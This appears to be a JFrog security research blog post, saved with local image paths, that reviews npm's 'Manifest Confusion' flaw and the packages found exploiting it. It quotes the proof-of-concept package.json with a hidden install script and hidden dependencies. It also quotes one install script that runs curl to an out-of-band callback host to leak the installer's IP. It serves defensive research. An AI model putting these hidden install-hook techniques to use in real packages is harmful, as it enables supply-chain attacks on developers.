@@ -1,0 +1,139 @@
+
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214212_145129\npmManifestConfusionSixMonthsLater863x3001.png
+
+Several months ago, Darcy Clarke, a former Staff Engineering Manager at GitHub, discovered the “Manifest Confusion” bug in the npm ecosystem. The bug was caused by the npm registry not validating whether the manifest file contained in the tarball (package.json) matches the manifest data published to the npm server. Clarke claims this to be a large threat, allowing malicious actors to deceive developers and hide harmful code from detection.
+Over the last few months, the JFrog Security Research team identified over eight hundred packages with discrepancies from their registry entries. Only eighteen of these were determined to be intentionally exploiting the bug. The majority were test packages crafted based on the Proof of Concept from the original post, specifically designed to assess the vulnerability – none of these packages were part of an actual attack.
+This blog post will provide a retrospective of the vulnerability, review how it was exploited in the wild, and examine the current state of affairs.
+Before diving into the impact of the vulnerability, let’s recall its details.
+How Manifest Confusion Works
+The general idea behind Manifest Confusion isn’t conceptually new – discrepancies between the validation and actual processing of software packages have always been a target in the systems that depend on manifests or signatures to describe package content.
+For instance, a decade ago, a vulnerability known as the ‘Master Key‘ was identified in early versions of Android. Similar to the npm manifest confusion, this vulnerability allowed attackers to inject a fake manifest file into the package. This exploited a system flaw where one Android subsystem was responsible for verifying the files inside the package while a different subsystem processed them, leading to a severe security lapse: an attacker could inject malicious content into the package signed by the valid certificate. Although this fake manifest was subject to verification, its ‘malicious counterpart’ was executed.
+Unlike Android, the npm infrastructure does not sign or validate every file of the packages it downloads. Instead, it displays the manifest through its web and CLI interfaces. The package.json file in every npm package plays an important role, from a security perspective, in defining the installer’s behavior. This file contains metadata that describes the package and includes various commands for the package installer.
+Key elements relevant to security in the package.json file:
+
+Scripts: These commands run at specific phases of the package lifecycle, such as installation (postinstall or preinstall scripts). Malicious packages often use pre/post install scripts to execute the attacker’s code on the user’s machine.
+Dependencies: Lists of external dependencies that the package requires. These dependencies are automatically downloaded and installed alongside the package. If any of these dependencies are vulnerable or malicious, they can compromise the security of the entire project.
+Considering all of this, it becomes critical to manage and represent the content of this file correctly. Proper analysis of scripts and dependencies reduces the risk of executing the malicious code on the developer’s machine.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214212_145129\1_Informationaboutthepackageintheterminalwindow.png
+Information about the package in the terminal window
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214212_145129\2_Informationaboutthepackageonthenpmwebsite.png
+Information about the package on the npm website
+How to trigger the Manifest Confusion bug
+The npm registry database receives the manifest during the package publishing process, not from the uploaded package tarball, but via the HTTP PUT request. This mechanism allows the creation of two versions of the manifest for the same package: one that is visible (but never actually used) and another that is processed during installation. The visible, or ‘fake,’ manifest can mislead developers and even audit tools that rely on the data available in the npm registry database. In reality, the installer takes the file package.json from the tarball, which may be different from the visible one supplied in the HTTP PUT request.
+In the proposed proof-of-concept, Darcy demonstrated the attack – he created a package containing scripts that are meant to be executed during installation and dependencies, and uploaded it to the NPM repository.
+{
+  "name": "express",
+  "version": "3.0.0",
+  "main": "index.js",
+  "scripts": {
+    "install": "touch ./bad-pkg-write && echo \"bad pkg exec!\"\n"
+  },
+  "license": "ISC",
+  "dependencies": {
+    "sleepover": "*"
+  }
+}
+Then he published a fake manifest file, which didn’t contain the install-time script to be executed, and had no listed dependencies.
+{
+    "name": "darcyclarke-manifest-pkg",
+    "version": "2.1.15",
+    "scripts": {},
+    "dependencies": {}
+}
+The npm website, npm’s CLI and most of the audit tools at the time, relied on the information from the npm registry DB, and didn’t show information about any dependencies or scripts. As we can see, the npm registry site still behaves the same to this day and is susceptible to this attack vector –
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214212_145129\3_Dependenciesofthemalformedpackageatthenpmwebsite.png
+Dependencies of the malformed package at the npm website
+Research Findings and Analysis
+Detecting packages that exploit the “manifest confusion” bug can be challenging. Especially because differences between the manifest in the npm registry and the package.json file inside the tarball are quite common. We identified over eight hundred cases where this mismatch occurred, and the vast majority of mismatches were not due to malicious intent. Many of these mismatches are intentionally introduced and are part of a normal package development and distribution processes. A notable example of such an intentional difference is the handling of GitHub dependencies, which often differ due to protocol specifications.
+Packages might specify dependencies hosted on GitHub, often including protocol specifications in their package.json file (like git://, https://, etc.). These specifications can lead to differences from the npm registry, where the dependencies might be listed without these protocol details.
+For example, protocol spec differences –
+https://github.com/
+vs .
+git+https://github.com/
+Or path differences –
+git+https://bitbucket.org/si-ecommerce/dragula/src
+vs.
+git+https://bitbucket.org/si-ecommerce/dragula.git
+Or even format differences, where a tarball entry contains a shortened link –
+"strongloop/loopback-workspace"
+vs.
+"git+https://github.com/strongloop/loopback-workspace"
+The same problem happens to the scripts section of the package file. A very common situation is when the package.json file contains development commands and the server-side manifest doesn’t.
+For example, a very common situation is when the tarball contains an entry called test and the visible manifest doesn’t –
+Entry in a tarball:
+{
+        "test": "echo \"Error: no test specified\" && exit 1"
+    }
+Vs. (empty) entry in the manifest:
+{}
+That makes a naive comparison of these manifests inefficient and requires additional filtering. Thus, we decided to only address differences in execution phases of the package lifetime scripts (install and start), packages whose names are completely different, and packages that contain completely different dependencies, assuming the version difference is insignificant.
+Packages found exploiting Manifest Confusion
+These are all of the packages we found in the npm registry which had notable manifest discrepancies. Note that all of them were published roughly when the original “Manifest Confusion” blog post went live. Some are still online today –
+
+
+ylxtest	yinlingxue	2023-07-03	–
+darcyclarke-manifest-pkg	darcyclarke-testing	2023-03-08	–
+Darcyclarke-testing-malformed	darcyclarke-testing	2022-11-02	–
+very-bad-pkg	l33t h4x0r	2023-07-28	+
+my-fallen-web	fallenfallenweb	2023-08-03	+
+lantrix-test	lantrix	2023-07-10	+
+imposter-pkg-poc	l33t h4x0r	2023-06-28	+
+eladpttesting	elad_pt	2023-07-05	+
+test_for_manifest_confusion1	star-map	2023-07-05	–
+test-npm-package-article	sergiycheck	2023-07-04	–
+manifest_poc	masteryoda101	2023-07-19	–
+manifest_poc_1	masteryoda101	2023-07-19	–
+manifest_poc_2	masteryoda101	2023-07-19	–
+manifest_confusion_poc	masteryoda101	2023-07-19	–
+manifest-confusion-testing-package	biobedded-systems-root	2023-10-12	–
+afutest	eggeggeg	2023-07-04	–
+yatai-web-ui	fallenapplle	2023-07-30	+
+trace-employed-spider-sensitize	weddige	2023-07-06	–
+List of the packages exploiting the manifest confusion vulnerability
+Five packages from the list above used the exact same payload as the original PpC, where a script in the package.json manifest was used to showcase the attack’s potential. This script instructed the npm tool to execute a benign shell script. It used the touch command to create a file named bad-pkg-write in the package’s working directory, followed by an echo command to display messages suggesting that the system had been compromised, thus demonstrating the exploit without causing actual harm.
+"scripts": 
+[{
+"install": "touch ./bad-pkg-write && echo \"bad pkg exec!\"\n"
+}]
+Ten more packages explored the usage of the fake package name.
+"name": [
+        "manifest-hack-poc",
+    ],
+vs
+    "name": [
+        "very-bad-pkg",
+    ],
+Seven packages were trying to hide dependencies. From the obvious names of dependencies we can understand these packages were used as non-truly-malicious PoCs –
+"dependencies": [
+        {
+            "malware": "*"
+        }]
+vs.
+"dependencies": []
+The most intrusive payload was found in the package named yatai-web-ui, that sends an HTTP request to the server, giving the author of the package the IP of the machine in which the package was installed, possibly for bug bounty purposes.
+{
+  "name": "yatai-web-ui",
+  "scripts": {
+    "install": "curl http://ujh8c087kibnexurwau9s3g12s8jw8.oastify.com"
+  },
+}
+Summary
+Despite the attention the original post gained in the npm community, the vulnerability initially presented a limited range of attack scenarios and as we saw, has not been exploited in real-world attacks. So far we have seen it being used only in PoCs. Also, it doesn’t seem that the npm registry maintainers perceive Manifest Confusion as a significant threat, since the website is still susceptible to this attack vector. Evidence of this can be seen in that most of the PoC packages related to this issue were not unpublished, and there are no apparent mitigations implemented against this threat. Moreover, some of the documented options of the npm manifest allow hiding dependencies from the UI, CLI, and potential audit tools.
+Additional examples for reference:
+https://docs.npmjs.com/cli/v10/configuring-npm/package-json#optionaldependencies
+https://docs.npmjs.com/cli/v10/configuring-npm/package-json#overrides
+https://docs.npmjs.com/cli/v10/configuring-npm/package-json#main
+https://docs.npmjs.com/cli/v10/configuring-npm/package-json#bin
+https://docs.npmjs.com/cli/v10/configuring-npm/package-json#github-urls
+Stay up-to-date with JFrog Security Research
+The security research team’s findings and research play an important role in improving the JFrog Software Supply Chain Platform’s application software security capabilities.
+Follow the latest discoveries and technical updates from the JFrog Security Research team on our research website, and on X @JFrogSecurity.
+https://github.com/
+git+https://github.com/
+git+https://bitbucket.org/si-ecommerce/dragula/src
+git+https://bitbucket.org/si-ecommerce/dragula.git
+"strongloop/loopback-workspace"
+"git+https://github.com/strongloop/loopback-workspace"
+test
+bad-pkg-write
+echo
